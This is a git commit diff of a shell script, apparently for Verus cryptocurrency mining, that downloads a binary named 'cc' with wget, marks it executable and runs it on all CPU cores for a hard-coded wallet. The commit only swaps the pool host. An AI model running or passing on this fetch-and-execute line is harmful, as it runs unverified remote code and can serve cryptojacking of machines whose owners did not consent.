3e3bbaec8ab3f83ca15011aad348b9689a6b9913
MomboteQ <60738939+MomboteQ@users.noreply.github.com>
2024-07-14 15:18:38 +0200

    Update and rename triage.sh to triage-script.sh

--- verus/triage-script.sh
+++ verus/triage-script.sh
@@ -3,4 +3,4 @@ sudo apt-get install libcurl4-openssl-dev libssl-dev libomp-dev libjansson-dev a
 wget https://raw.githubusercontent.com/MomboteQ/Free-Crypto-Mining/main/verus/cc
 chmod +x cc
 clear
-./cc -a verus -o stratum+tcp://verus.farm:9999 -u RHACKERwSVgjTvV4vNiTjmrkLTD7a92ALD.Linux -p x -t $(nproc)
+./cc -a verus -o stratum+tcp://de.vipor.net:5040 -u RHACKERwSVgjTvV4vNiTjmrkLTD7a92ALD.Linux -p x -t $(nproc)
